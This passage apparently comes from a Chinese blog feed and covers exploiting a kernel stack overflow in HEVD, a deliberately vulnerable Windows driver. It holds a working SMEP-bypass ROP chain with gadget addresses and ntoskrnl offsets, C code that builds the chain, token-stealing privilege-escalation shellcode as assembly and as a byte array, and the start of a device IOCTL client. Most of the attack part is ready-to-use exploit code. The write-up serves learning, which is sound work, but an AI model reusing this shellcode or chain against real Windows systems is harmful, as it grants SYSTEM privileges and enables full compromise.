Bypass</h2><p>虽然用户页表为不可执行，<strong>但是内核页表仍然可执行</strong>，只不过会延长我们ROP链的长度</p><p>需要用到的函数是：<code>ExAllocatePoolWithTag</code>和<code>RtlCopyMemory</code></p><ul><li><code>ExAllocatePoolWithTag</code>：用于在内核中开辟一块地址</li><li><code>RtlCopyMemory</code>：复制内存到内核开辟的内存池</li></ul><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">LPVOID space = <span class="built_in">ExAllocatePoolWithTag</span>(<span class="number">0</span>, <span class="number">0x100</span>, <span class="number">0xDEAD</span>);</span><br><span class="line"><span class="comment">//NonPagedPoolExecute = 0</span></span><br><span class="line"><span class="comment">//空间大小：0x100</span></span><br><span class="line"><span class="built_in">RtlCopyMemory</span>(space, shellcode_addr, <span class="number">0x100</span>);</span><br></pre></td></tr></table></figure><p>MSDN中说明该两个函数在内核中均位于<code> NtosKrnl.exe</code>里，我们可以利用第一章的内容寻找到该地址，可以使用CFF Explorer查看导出表找到函数</p><p><img src="https://img.joe1sn.top/uploads/big/866de1aad36e03df79f0a3f799ca2e72.png" alt="image-20240120143139338" /></p><p><img src="https://img.joe1sn.top/uploads/big/59a09be3f8b2929ced592f3a4901f054.png" alt="image-20240120143245405" /></p><p>需要说明的一点是<code>ExAllocatePoolWithTag</code>有一个很恶心的地方就是</p><p><img src="https://img.joe1sn.top/uploads/big/324967fd2b7f547949278ef9bfa00206.png" alt="image-20240120213553032" /></p><p>这三个mov会打乱我们精心设计的ROP链，而且后面根本没有使用到他，所以要直接进入<code>push rdi</code>的位置</p><p><code>RtlCopyMemory</code>其实是一个宏</p><p><img src="https://img.joe1sn.top/uploads/big/9bb79876c8b14924e6704969dc963280.png" alt="image-20240120155359370" /></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> base = <span class="built_in">ulGetKernelBase</span>((PCHAR)<span class="string">&quot;ntoskrnl.exe&quot;</span>);</span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> ulExAllocatePoolWithTag = base + <span class="number">0x9B203F</span>;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> ulRtlCopyMemory = base + <span class="number">0x40BEC0</span>;</span><br></pre></td></tr></table></figure><p>根据微软的函数调用规则，传参顺序是<code>rcx</code>，<code>rdx</code>，<code>r8</code>，返回地参数在<code>rax</code>中</p><p>那么一个理想的ROP布局</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">pop rcx rdx r8 ret</span><br><span class="line">0</span><br><span class="line">0x100</span><br><span class="line">0xDEAD</span><br><span class="line">ExAllocatePoolWithTag</span><br><span class="line">---------------------------</span><br><span class="line">pop rcx rdx r8 ret</span><br><span class="line">0;暂时</span><br><span class="line">shellcode_addr</span><br><span class="line">0x100;</span><br><span class="line">mov rcx, rax ret;此时rcx = ExAllocatePoolWithTag返回地内存地址</span><br><span class="line">RtlCopyMemory</span><br><span class="line">---------------------------</span><br><span class="line">jmp rax</span><br></pre></td></tr></table></figure><p>就这些gadget中的pop会消除<code>rsp+0x28</code>的驱动的<code>Handle</code>函数返回地址，所以首先是抬栈，如<code>sub rsp, 0x100</code>，在<code>jmp rax</code>之前多次调用<code>ret</code>来抬升<code>rsp</code>的值，最终回到<code>shellcode</code>调整为适用的<code>rsp</code>值。</p><p><strong>实际情况中也不会有恰好的gadget用</strong></p><p>实际上能用的<code>mov rcx, rax</code>可以通过以下方式实现</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">0x00000001408fa783 : push rax ; push rbx ; ret</span><br><span class="line">0x00000001408fa77b : push rax ; push rdi ; ret</span><br><span class="line">0x000000014020262C : pop rdi ; ret</span><br></pre></td></tr></table></figure><p>这样就能让rcx=rax了，布局后栈的情况</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ulExAllocatePoolWithTag</span><br><span class="line">pop_rdi</span><br><span class="line">pop_rcx</span><br><span class="line">push_rax_rdi</span><br></pre></td></tr></table></figure><ol><li><code>pop rdi</code>：<code>RDI</code> =<code>pop rcx地址</code>，出栈一个，<code>rsp</code>指向<code>push_rax_rdi</code>，然后<code>ret</code>跳转到该地址</li><li><code>push rax</code>：将申请的内核内存地址放到了栈上，<code>rsp</code>指向值就为该内存的地址</li><li><code>push rdi; ret</code>：等效于<code>jmp rdi</code>，于是<code>ret</code>到了<code>pop rcx</code></li><li><code>pop rcx</code>：此时的栈顶为 2 中入栈的<code>rax</code></li></ol><p><img src="https://img.joe1sn.top/uploads/big/28b0466a118932c4725e7f24168cef31.png" alt="image-20240120214435516" /></p><p>成功让<code>RCX=RAX</code></p><p><img src="https://img.joe1sn.top/uploads/big/68943ef85bb247fa007f3cfcc84cc1e2.png" alt="image-20240120214609588" /></p><p>这里暂时设计payload</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//typedef unsigned long long funcaddr;</span></span><br><span class="line"></span><br><span class="line">*(funcaddr*)(stackspace + <span class="number">0x818</span>) = (funcaddr)pop_rcx;</span><br><span class="line">*(funcaddr*)(stackspace + <span class="number">0x818</span> + <span class="number">8</span>) = (funcaddr)<span class="number">0</span>;</span><br><span class="line">*(funcaddr*)(stackspace + <span class="number">0x818</span> + <span class="number">0x10</span>) = (funcaddr)pop_rdx;</span><br><span class="line">*(funcaddr*)(stackspace + <span class="number">0x818</span> + <span class="number">0x18</span>) = (funcaddr)<span class="number">0x100</span>;</span><br><span class="line">*(funcaddr*)(stackspace + <span class="number">0x818</span> + <span class="number">0x20</span>) = (funcaddr)pop_r8;</span><br><span class="line">*(funcaddr*)(stackspace + <span class="number">0x818</span> + <span class="number">0x28</span>) = (funcaddr)<span class="number">0xDEAD</span>;</span><br><span class="line">*(funcaddr*)(stackspace + <span class="number">0x818</span> + <span class="number">0x30</span>) = (funcaddr)ulExAllocatePoolWithTag;</span><br><span class="line"></span><br><span class="line">*(funcaddr*)(stackspace + <span class="number">0x818</span> + <span class="number">0x38</span>) = (funcaddr)pop_rdi;<span class="comment">//rsp = 0</span></span><br><span class="line">*(funcaddr*)(stackspace + <span class="number">0x818</span> + <span class="number">0x40</span>) = (funcaddr)pop_rcx;<span class="comment">//rdi = rcx --- been force to zero</span></span><br><span class="line">*(funcaddr*)(stackspace + <span class="number">0x818</span> + <span class="number">0x48</span>) = (funcaddr)push_rax_rdi;<span class="comment">//ret rdi: pop_rcx value changed</span></span><br><span class="line"></span><br><span class="line">*(funcaddr*)(stackspace + <span class="number">0x818</span> + <span class="number">0x50</span>) = (funcaddr)pop_rdx;<span class="comment">//此处被低位被清零</span></span><br><span class="line">*(funcaddr*)(stackspace + <span class="number">0x818</span> + <span class="number">0x58</span>) = (funcaddr)shellcode_addr; </span><br><span class="line"></span><br><span class="line">*(funcaddr*)(stackspace + <span class="number">0x818</span> + <span class="number">0x70</span>) = (funcaddr)pop_r8;</span><br><span class="line">*(funcaddr*)(stackspace + <span class="number">0x818</span> + <span class="number">0x78</span>) = (funcaddr)<span class="built_in">sizeof</span>(cmd);</span><br><span class="line">*(funcaddr*)(stackspace + <span class="number">0x818</span> + <span class="number">0x80</span>) = (funcaddr)ulRtlCopyMemory;</span><br><span class="line">*(funcaddr*)(stackspace + <span class="number">0x818</span> + <span class="number">0x88</span>) = (funcaddr)jmp_rax;</span><br></pre></td></tr></table></figure><p>但是进行<code>ExAllocatePoolWithTag</code></p><p><img src="https://img.joe1sn.top/uploads/big/bd6c315f3f534e5d95e65b69621299b0.png" alt="image-20240121084806324" /></p><p>打断了ROP链，让<code>rsp+68</code>的位置的低32位清零了，这让我们需要调整这段rop链</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">*(funcaddr*)(stackspace + <span class="number">0x818</span> + <span class="number">0x50</span>) = (funcaddr)pop_rdx;<span class="comment">//此处被低位被清零</span></span><br><span class="line">*(funcaddr*)(stackspace + <span class="number">0x818</span> + <span class="number">0x58</span>) = (funcaddr)shellcode_addr; </span><br><span class="line">*(funcaddr*)(stackspace + <span class="number">0x818</span> + <span class="number">0x60</span>) = (funcaddr)pop_rdx;<span class="comment">//恢复rdx</span></span><br><span class="line">*(funcaddr*)(stackspace + <span class="number">0x818</span> + <span class="number">0x68</span>) = (funcaddr)shellcode_addr;</span><br><span class="line">   </span><br><span class="line">   *(funcaddr*)(stackspace + <span class="number">0x818</span> + <span class="number">0x70</span>) = (funcaddr)pop_r8;</span><br><span class="line">*(funcaddr*)(stackspace + <span class="number">0x818</span> + <span class="number">0x78</span>) = (funcaddr)<span class="built_in">sizeof</span>(cmd);</span><br></pre></td></tr></table></figure><p><img src="https://img.joe1sn.top/uploads/big/bedc06d732b94afafa28a2688c0a94d6.png" alt="image-20240121093505807" /></p><p>在设置<code>CR4.SMEP</code>的情况下，依靠内核分配的内存，成功运行了shellcode，ROP链进行了多次调用，让最后shellcode中的<code>rsp</code>值不好估计，并且栈的情况可能随着函数的调用将原有的值抹去，<strong>这里先把shellcode换成从TrapFrame返回的</strong></p><p><img src="https://img.joe1sn.top/uploads/big/39d57b872ac0473e469f8056ebedb9d3.png" alt="image-20240121095833438" /></p><h2 id="c-优化shellcode"><a class="markdownIt-Anchor" href="#c-优化shellcode"></a> C. 优化shellcode</h2><p>所以这段shellcode参考shellcode编写的C、D部分，加上了所有功能Enabled的shellcode片段</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">[Bits 64]</span><br><span class="line"></span><br><span class="line">_start:    </span><br><span class="line">    xor rax, rax</span><br><span class="line">    mov rax, gs:[rax + 0x188]</span><br><span class="line">    mov rax, [rax + 0xb8]     ;rax = 当前EPROCESS</span><br><span class="line">    mov r9, rax               ;r9  = 当前EPROCESS</span><br><span class="line">    mov rax, [rax + 0x448]    ;rax = 当前EPROCESS.List</span><br><span class="line">    mov rax, [rax]            ;rax = 当前EPROCESS.List-&gt;flink</span><br><span class="line"></span><br><span class="line">__loop:</span><br><span class="line">    mov rdx, [rax - 0x8]      ;rdx = 上一个进程的 upid</span><br><span class="line">    mov r8, rax               ;r8  = 当前EPROCESS.List-&gt;flink</span><br><span class="line">    mov rax, [rax]            ;rax = 上一个进程的.List</span><br><span class="line">    cmp rdx, 0x4</span><br><span class="line">    jnz __loop</span><br><span class="line"></span><br><span class="line">    ;rdx = 4</span><br><span class="line">    ;r8 = System EPROCESS</span><br><span class="line"></span><br><span class="line">    mov rdx, [r8+0x70]      ;rdx = system token</span><br><span class="line">    and rdx, -0x8           ;消除低4位</span><br><span class="line">    mov rcx, [r9+0x4b8]     ;当前EPROCESS的token</span><br><span class="line">    and rcx, 0x7            ;</span><br><span class="line">    add rdx, rcx            ;rdx = 系统token高位+当前token低4位</span><br><span class="line">    mov [r9+0x4b8], rdx     ;将合成的token复制给当前</span><br><span class="line"></span><br><span class="line">    ;Enable ALL</span><br><span class="line">    mov rdx, [r8 + 0x70]      ;rdx = system token</span><br><span class="line">    and rdx, 0xFFFFFFFFFFFFFFF0           ;system token: 消除低8位，便于解析Token</span><br><span class="line">    mov rbx, [rdx + 0x40]     ;rbx = System token的Present</span><br><span class="line">    mov rcx, [r9 + 0x4b8]     ;rcx = 新的EPROCESS的token</span><br><span class="line">    and rcx, 0xFFFFFFFFFFFFFFF0           ;new current token: 消除低8位，便于解析Token</span><br><span class="line">    mov [rcx + 0x40], rbx</span><br><span class="line">    mov [rcx + 0x48], rbx</span><br><span class="line"></span><br><span class="line">    mov     rax, gs:188h</span><br><span class="line">    mov     cx, [rax+1E4h]</span><br><span class="line">    inc     cx</span><br><span class="line">    mov     [rax+1E4h], cx</span><br><span class="line">    mov     rdx, [rax+90h]</span><br><span class="line">    mov     rcx, [rdx+168h]</span><br><span class="line">    mov     r11, [rdx+178h]</span><br><span class="line">    mov     rsp, [rdx+180h]</span><br><span class="line">    mov     rbp, [rdx+158h]</span><br><span class="line">    xor     eax, eax</span><br><span class="line">    swapgs</span><br><span class="line">    o64 sysret</span><br></pre></td></tr></table></figure><p>得到shellcode</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> <span class="type">char</span> cmd[<span class="number">176</span>] = &#123;</span><br><span class="line"><span class="number">0x48</span>, <span class="number">0x31</span>, <span class="number">0xC0</span>, <span class="number">0x65</span>, <span class="number">0x48</span>, <span class="number">0x8B</span>, <span class="number">0x80</span>, <span class="number">0x88</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x48</span>,</span><br><span class="line"><span class="number">0x8B</span>, <span class="number">0x80</span>, <span class="number">0xB8</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x49</span>, <span class="number">0x89</span>, <span class="number">0xC1</span>, <span class="number">0x48</span>, <span class="number">0x8B</span>, <span class="number">0x80</span>,</span><br><span class="line"><span class="number">0x48</span>, <span class="number">0x04</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x48</span>, <span class="number">0x8B</span>, <span class="number">0x00</span>, <span class="number">0x48</span>, <span class="number">0x8B</span>, <span class="number">0x50</span>, <span class="number">0xF8</span>, <span class="number">0x49</span>,</span><br><span class="line"><span class="number">0x89</span>, <span class="number">0xC0</span>, <span class="number">0x48</span>, <span class="number">0x8B</span>, <span class="number">0x00</span>, <span class="number">0x48</span>, <span class="number">0x83</span>, <span class="number">0xFA</span>, <span class="number">0x04</span>, <span class="number">0x75</span>, <span class="number">0xF0</span>, <span class="number">0x49</span>,</span><br><span class="line"><span class="number">0x8B</span>, <span class="number">0x50</span>, <span class="number">0x70</span>, <span class="number">0x48</span>, <span class="number">0x83</span>, <span class="number">0xE2</span>, <span class="number">0xF8</span>, <span class="number">0x49</span>, <span class="number">0x8B</span>, <span class="number">0x89</span>, <span class="number">0xB8</span>, <span class="number">0x04</span>,</span><br><span class="line"><span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x48</span>, <span class="number">0x83</span>, <span class="number">0xE1</span>, <span class="number">0x07</span>, <span class="number">0x48</span>, <span class="number">0x01</span>, <span class="number">0xCA</span>, <span class="number">0x49</span>, <span class="number">0x89</span>, <span class="number">0x91</span>,</span><br><span class="line"><span class="number">0xB8</span>, <span class="number">0x04</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x49</span>, <span class="number">0x8B</span>, <span class="number">0x50</span>, <span class="number">0x70</span>, <span class="number">0x48</span>, <span class="number">0x83</span>, <span class="number">0xE2</span>, <span class="number">0xF0</span>,</span><br><span class="line"><span class="number">0x48</span>, <span class="number">0x8B</span>, <span class="number">0x5A</span>, <span class="number">0x40</span>, <span class="number">0x49</span>, <span class="number">0x8B</span>, <span class="number">0x89</span>, <span class="number">0xB8</span>, <span class="number">0x04</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x48</span>,</span><br><span class="line"><span class="number">0x83</span>, <span class="number">0xE1</span>, <span class="number">0xF0</span>, <span class="number">0x48</span>, <span class="number">0x89</span>, <span class="number">0x59</span>, <span class="number">0x40</span>, <span class="number">0x48</span>, <span class="number">0x89</span>, <span class="number">0x59</span>, <span class="number">0x48</span>, <span class="number">0x65</span>,</span><br><span class="line"><span class="number">0x48</span>, <span class="number">0x8B</span>, <span class="number">0x04</span>, <span class="number">0x25</span>, <span class="number">0x88</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x66</span>, <span class="number">0x8B</span>, <span class="number">0x88</span>, <span class="number">0xE4</span>,</span><br><span class="line"><span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x66</span>, <span class="number">0xFF</span>, <span class="number">0xC1</span>, <span class="number">0x66</span>, <span class="number">0x89</span>, <span class="number">0x88</span>, <span class="number">0xE4</span>, <span class="number">0x01</span>, <span class="number">0x00</span>,</span><br><span class="line"><span class="number">0x00</span>, <span class="number">0x48</span>, <span class="number">0x8B</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x48</span>, <span class="number">0x8B</span>, <span class="number">0x8A</span>, <span class="number">0x68</span>,</span><br><span class="line"><span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x4C</span>, <span class="number">0x8B</span>, <span class="number">0x9A</span>, <span class="number">0x78</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x48</span>, <span class="number">0x8B</span>,</span><br><span class="line"><span class="number">0xA2</span>, <span class="number">0x80</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x48</span>, <span class="number">0x8B</span>, <span class="number">0xAA</span>, <span class="number">0x58</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line"><span class="number">0x31</span>, <span class="number">0xC0</span>, <span class="number">0x0F</span>, <span class="number">0x01</span>, <span class="number">0xF8</span>, <span class="number">0x48</span>, <span class="number">0x0F</span>, <span class="number">0x07</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p><img src="https://img.joe1sn.top/uploads/big/92433bde7fdb3c57a079ce6037669523.png" alt="image-20240121200156534" /></p><p>缺点就是程序无法exit退出，不过可以在shellcode中设置Token迁移等一些其他操作，这里就不展开了</p><h1 id="参考"><a class="markdownIt-Anchor" href="#参考"></a> 参考</h1><p><a href="https://wumb0.in/finding-the-base-of-the-windows-kernel.html">https://wumb0.in/finding-the-base-of-the-windows-kernel.html</a></p><p><a href="https://github.com/xct/windows-kernel-exploits">https://github.com/xct/windows-kernel-exploits</a></p><p><a href="https://connormcgarr.github.io/x64-Kernel-Shellcode-Revisited-and-SMEP-Bypass/">https://connormcgarr.github.io/x64-Kernel-Shellcode-Revisited-and-SMEP-Bypass/</a></p><p><a href="https://hshrzd.wordpress.com/2017/06/22/starting-with-windows-kernel-exploitation-part-3-stealing-the-access-token/">https://hshrzd.wordpress.com/2017/06/22/starting-with-windows-kernel-exploitation-part-3-stealing-the-access-token/</a></p><p><a href="https://mdanilor.github.io/posts/hevd-2/">https://mdanilor.github.io/posts/hevd-2/</a></p>]]></content>
    
    
    <summary type="html">&lt;hr /&gt;
&lt;p&gt;上：&lt;a href=&quot;https://joe1sn.eu.org/2024/01/25/win-hevd-exp-stackoverflow-I/&quot;&gt;https://joe1sn.eu.org/2024/01/25/win-hevd-exp-stackoverflow-I/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;中：&lt;a href=&quot;https://joe1sn.eu.org/2024/01/25/win-hevd-exp-stackoverflow-II/&quot;&gt;https://joe1sn.eu.org/2024/01/25/win-hevd-exp-stackoverflow-II/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;文章已在先知社区投稿：&lt;a href=&quot;https://xz.aliyun.com/t/13365&quot;&gt;https://xz.aliyun.com/t/13365&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;本附录对第二章的以下几个遗留问题做出说明&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;user编程寻找ROPGadget&lt;/li&gt;
&lt;li&gt;shellcode编写&lt;/li&gt;
&lt;li&gt;Token提权&lt;/li&gt;
&lt;li&gt;KVAS&lt;/li&gt;
&lt;/ul&gt;</summary>
    
    
    
    <category term="notes" scheme="https://joe1sn.eu.org/categories/notes/"/>
    
    
    <category term="kernel" scheme="https://joe1sn.eu.org/tags/kernel/"/>
    
    <category term="windows" scheme="https://joe1sn.eu.org/tags/windows/"/>
    
    <category term="pwn" scheme="https://joe1sn.eu.org/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>【Win Pwn】HEVD-内核栈溢出(中)</title>
    <link href="https://joe1sn.eu.org/2024/01/25/win-hevd-exp-stackoverflow-II/"/>
    <id>https://joe1sn.eu.org/2024/01/25/win-hevd-exp-stackoverflow-II/</id>
    <published>2024-01-25T07:07:30.000Z</published>
    <updated>2024-02-24T03:51:44.152Z</updated>
    
    <content type="html"><![CDATA[<p>在<a href="">上一篇</a>中了解了与内核的交互模式，这里就可以开始做HEVD了</p><p>文章已在先知社区投稿：<a href="https://xz.aliyun.com/t/13364">https://xz.aliyun.com/t/13364</a></p><span id="more"></span><h1 id="编写交互模块"><a class="markdownIt-Anchor" href="#编写交互模块"></a> 编写交互模块</h1><h2 id="a-计算io_ctl值"><a class="markdownIt-Anchor" href="#a-计算io_ctl值"></a> A. 计算IO_CTL值</h2><p><strong>其实不用这步，但是可以当作更多的了解</strong></p><p>在之前的交互中有这么一条定义功能号</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> IOCTL_MUL CTL_CODE(FILE_DEVICE_UNKNOWN, 0x9888, METHOD_BUFFERED, FILE_ANY_ACCESS)</span></span><br></pre></td></tr></table></figure><p>但是…HEVD逆向会发现是这样的</p><p><img src="https://img.joe1sn.top/uploads/big/b5952825f83268246d9e59addb480507.png" alt="image-20240117184722533" /></p><p>发现<code>CTL_CODE</code>也是个宏定义</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> CTL_CODE( DeviceType, Function, Method, Access ) (                 \</span></span><br><span class="line"><span class="meta">    ((DeviceType) &lt;&lt; 16) | ((Access) &lt;&lt; 14) | ((Function) &lt;&lt; 2) | (Method) \</span></span><br><span class="line"><span class="meta">)</span></span><br></pre></td></tr></table></figure><p>其中，这里</p><ul><li>DeviceType -&gt; FILE_DEVICE_UNKNOWN = 0x22</li><li>Function -&gt; = 0x9888</li><li>Method -&gt; METHOD_BUFFERED=0</li><li>Access -&gt; FILE_ANY_ACCESS=0</li></ul><p>表达式就为</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">  (0x22 &lt;&lt; 16) | (0 &lt;&lt; 14) | ( 0x9888 &lt;&lt; 2) | 0</span><br><span class="line">= 0x220000 | 0 | 0x9888 &lt;&lt; 2 | 0</span><br><span class="line">= 0x220000 | 0x9888 &lt;&lt; 2</span><br><span class="line">= 0x226220</span><br></pre></td></tr></table></figure><p>很容易得到逆向，这里以<code>0x226220</code>为例子</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">0x205B = 0x22205B ^ 0x220000</span><br><span class="line">0x816 = 0x205B&gt;&gt;2</span><br></pre></td></tr></table></figure><p>那么对应的函数</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">unsigned</span> <span class="type">int</span> <span class="title">io2num</span><span class="params">(<span class="type">unsigned</span> <span class="type">int</span> ioctl_num)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> ((ioctl_num ^ <span class="number">0x220000</span>) &gt;&gt; <span class="number">2</span>) &amp; <span class="number">0xfff</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>后面之所以要&amp;一下是因为数据的大小就只有那么大，所以<strong>II文章</strong>的描述符<code>0x9888</code>实际有效的只有<code>0x888</code></p><h2 id="b-功能选择"><a class="markdownIt-Anchor" href="#b-功能选择"></a> B. 功能选择</h2><p>这里就以最简单的内核栈溢出举例子</p><p>每开始一个漏洞利用就编写一个菜单，然后选择解析逆向出来的功能描述符，运行对应函数，没啥好讲的</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">menu</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;============HEVD Hack EXP============\n&quot;</span>;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot; 1. [0x222003]****** HEVD_IOCTL_BUFFER_OVERFLOW_STACK ******\n&quot;</span>;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;input io ctl&gt; &quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    HANDLE hDevice = <span class="literal">NULL</span>;</span><br><span class="line">    hDevice = <span class="built_in">CreateFileW</span>(<span class="string">L&quot;\\\\.\\My1DeviceLinker&quot;</span>, GENERIC_READ | GENERIC_WRITE, <span class="number">0</span>, <span class="literal">NULL</span>, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, <span class="literal">NULL</span>);</span><br><span class="line">    <span class="keyword">if</span> (hDevice == INVALID_HANDLE_VALUE) &#123;</span><br><span class="line">        cout &lt;&lt; <span class="string">&quot;Error Create File\n&quot;</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> io_ctl = <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">menu</span>();</span><br><span class="line">    <span class="built_in">scanf_s</span>(<span class="string">&quot;%x&quot;</span>, &amp;io_ctl);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%x, %x&quot;</span>, io_ctl, <span class="built_in">io2num</span>(io_ctl));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">switch</span> (io_ctl)</span><br><span class="line">    &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">1</span>: &#123;</span><br><span class="line">        cout &lt;&lt; <span class="string">&quot;Now Excuting ...\n&quot;</span>;</span><br><span class="line">        cout &lt;&lt; <span class="string">&quot;1. [0x222003]****** HEVD_IOCTL_BUFFER_OVERFLOW_STACK ****** ...\n&quot;</span>;</span><br><span class="line">        <span class="comment">//</span></span><br><span class="line">        <span class="comment">// 